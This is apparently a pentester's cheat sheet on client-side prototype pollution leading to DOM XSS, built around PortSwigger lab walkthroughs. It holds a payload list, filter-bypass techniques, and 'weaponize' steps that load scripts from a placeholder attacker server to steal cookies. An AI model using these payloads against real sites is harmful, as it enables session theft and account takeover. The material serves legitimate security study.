# Prototype pollution — Client-side (DOM XSS via gadgets)

Inject properties into `Object.prototype` via query string or URL fragment; any JS gadget that reads from the prototype and passes the value to a DOM sink (script src, innerHTML, eval) becomes exploitable. Key insight: the injected property is inherited by every object, so gadgets don't need to reference `__proto__` directly.

## Quick reference

```
# Confirm PP source (bracket notation)
/?__proto__[foo]=bar
# → DevTools Console: Object.prototype → shows foo="bar"

# Confirm PP source (dot notation)
/?__proto__.foo=bar

# Confirm PP source (URL fragment)
/#__proto__[foo]=bar

# DOM XSS via transport_url gadget
/?__proto__[transport_url]=data:,alert(1)

# Third-party library via hash
/#__proto__[transport_url]=data:,alert(1)

# DOM Invader auto-scan
# Enable DOM Invader → enable prototype pollution → reload → Scan for gadgets → Exploit
```

## Root cause

Client-side JS code merges query parameters or URL fragment data into config objects using recursive merge without sanitizing `__proto__`. When a gadget later reads `config.transport_url` (for example), it inherits the attacker-injected value from `Object.prototype` and passes it to `document.createElement('script').src` or similar DOM sink.

## Find it

1. Inject `/?__proto__[canary]=xyz` → DevTools Console → `Object.prototype` → look for `canary`.
2. Try all three vectors: `__proto__[x]=`, `__proto__.x=`, `#__proto__[x]=`.
3. If one works, search JS source files for gadgets: properties read from config objects that flow to: `script.src`, `location.href`, `eval()`, `innerHTML`, `document.write()`.
4. Use DOM Invader: enable PP option → reload → Sources tab → DOM Invader tab → "Scan for gadgets" → exploit button.

## Technique

**Lab 1 & 2 — transport_url gadget (searchLogger / searchLoggerConfigurable):**
1. `/?__proto__[foo]=bar` → DevTools Console → `Object.prototype` shows `foo` → PP confirmed.
2. Read `/resources/js/searchLogger.js` (Sources tab) → `config.transport_url` passed to `new Script(config.transport_url)`.
3. `/?__proto__[transport_url]=data:,alert(1)` → script element created with data URI → alert fires.

**Lab 3 — dot notation vector:**
1. `/?__proto__[foo]=bar` → Object.prototype clean → PP fails with bracket notation.
2. `/?__proto__.foo=bar` → Object.prototype shows `foo` → alternative vector works.
3. Same transport_url gadget exploitable via `/?__proto__.transport_url=data:,alert(1)`.

**Lab 5 — third-party library, hash source:**
1. DOM Invader: enable PP scan → reload page.
2. DOM Invader detects two PP vectors in the URL hash (`#`).
3. Scan for gadgets → gadget found → DOM Invader generates exploit URL → alert fires.

## Payload arsenal

```
# Source testing — bracket notation
/?__proto__[foo]=bar

# Source testing — dot notation
/?__proto__.foo=bar

# Source testing — URL fragment
/#__proto__[foo]=bar

# Source testing — constructor.prototype
/?constructor.prototype.foo=bar

# DOM XSS — transport_url (script src gadget)
/?__proto__[transport_url]=data:,alert(1)
/?__proto__.transport_url=data:,alert(1)
/#__proto__[transport_url]=data:,alert(1)

# DOM XSS — other common gadgets
/?__proto__[innerHTML]=<img src=1 onerror=alert(1)>
/?__proto__[src]=//EXPLOIT-SERVER/payload.js
```

## Bypasses

| Defense | Bypass |
|---|---|
| `__proto__` keyword filtered | Use dot notation: `__proto__.foo=bar` |
| `constructor.prototype` filtered | Use URL fragment: `#__proto__[x]=y` |
| Both bracket and dot blocked | Double-nested (see Advanced-bypass/) |
| Hash source only | DOM Invader auto-detects hash-based PP |
| Third-party lib, no obvious gadget | DOM Invader "Scan for gadgets" finds non-obvious sinks |

## Exploitation walkthrough

1. Confirm PP source: `/?__proto__[canary]=xyz` → Console → `Object.prototype.canary === "xyz"`.
2. Find gadget: Sources tab → search `config.` / `options.` → trace to sink.
3. Inject: `/?__proto__[GADGET_PROP]=PAYLOAD` → verify sink triggers.
4. Weaponize: use `data:,alert(document.cookie)` or `//EXPLOIT-SERVER/steal.js` depending on sink type.

## Chaining

- DOM XSS → cookie theft → [Authentication](../../Authentication/) bypass
- transport_url = attacker script → arbitrary JS execution → [XSS/Exploiting-XSS](../../XSS/Exploiting-XSS/)
- If gadget writes to `location.href` → open redirect → [DOM-based-vulnerabilities/Open-redirection-and-cookie-manipulation](../../DOM-based-vulnerabilities/Open-redirection-and-cookie-manipulation/)

## Tools

- **DOM Invader** — enable prototype pollution, scan sources and gadgets automatically
- **Burp Proxy** — intercept and modify URL query string / fragment
- **DevTools Console** — verify `Object.prototype` after injection

## Labs

### Client-side prototype pollution via browser APIs [Practitioner]
`/?__proto__[foo]=bar` → Object.prototype shows foo. Gadget in `searchLoggerConfigurable.js` passes `config.transport_url` to browser API. `/?__proto__[transport_url]=data:,alert(1)` → XSS fires. Key insight: browser APIs (script src, etc.) become gadgets when config is pulled from inherited prototype.

### DOM XSS via client-side prototype pollution [Practitioner]
Bracket notation `/?__proto__[foo]=bar` confirms PP. Gadget in `searchLogger.js`: `config.transport_url` → `new Script(url)`. `/?__proto__[transport_url]=data:,alert(1)` → DOM XSS. Key insight: find gadgets by searching JS source for properties read from config objects that flow to DOM sinks.

### DOM XSS via an alternative prototype pollution vector [Practitioner]
Bracket notation fails; dot notation `/?__proto__.foo=bar` succeeds (different URL parsing). Same transport_url gadget. Key insight: always test all PP vectors — apps often block one but not others.

### Client-side prototype pollution in third-party libraries [Practitioner]
PP source is in the URL fragment (`#`). DOM Invader auto-detects two hash-based PP vectors, then scans for gadgets and generates the exploit URL. Key insight: DOM Invader is essential for third-party library PP where gadgets aren't obvious in source.

## Real-world notes

- `transport_url` is the canonical lab gadget; in the wild look for any config property that reaches `script.src`, `iframe.src`, `location`, or `innerHTML`.
- URL hash PP is under-tested because fragments aren't sent to the server — scanners miss them; browser-side tools like DOM Invader are required.
- `Object.assign({}, userInput)` is NOT safe — it copies the `__proto__` key literally, which modern engines still route to prototype pollution.
- Recursive merge functions (lodash <4.17.5, jQuery <3.4.0) are known PP sinks.

## References

- https://portswigger.net/web-security/prototype-pollution/client-side
- https://portswigger.net/web-security/prototype-pollution/javascript-prototypes-and-inheritance
